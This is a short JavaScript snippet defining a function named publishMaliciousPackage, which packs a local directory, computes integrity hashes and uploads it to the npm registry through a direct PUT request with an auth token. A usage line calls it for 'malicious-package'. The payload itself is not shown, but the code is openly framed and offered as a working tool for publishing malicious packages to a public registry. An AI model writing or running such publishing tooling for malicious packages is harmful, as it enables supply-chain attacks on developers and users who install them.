const ssri = require('ssri');
const pack = require('libnpmpack');
const fetch = require('npm-registry-fetch');

async function publishMaliciousPackage(packageName, version, pathToMaliciousPkgDir, npmAuthToken) {
    const tarball = await pack(pathToMaliciousPkgDir);
    const integrity = ssri.fromData(tarball, { algorithms: ['sha1', 'sha512'] });

    const manifest = {
        _id: `${packageName}@${version}`,
        name: packageName,
        versions: {
            [version]: {
                _id: `${packageName}@${version}`,
                name: packageName,
                version: version,
                dist: {
                    integrity: integrity.toString(),
                    shasum: integrity.sha1().toString(),
                    tarball: '' // This field is often not critical for the PUT request itself as _attachments contains the data
                }
            }
        },
        _attachments: {
            0: {
                content_type: 'application/octet-stream',
                data: tarball.toString('base64'),
                length: tarball.length
            }
        }
    };

    await fetch.PUT(`/-/${packageName}`, {
        spec: { auth: { token: npmAuthToken } },
        body: manifest
    });
    console.log(`Published ${packageName}@${version}`);
}

// Usage example:
publishMaliciousPackage('malicious-package', '1.0.0', './pkg/', '<YOUR_NPM_AUTH_TOKEN>');
```
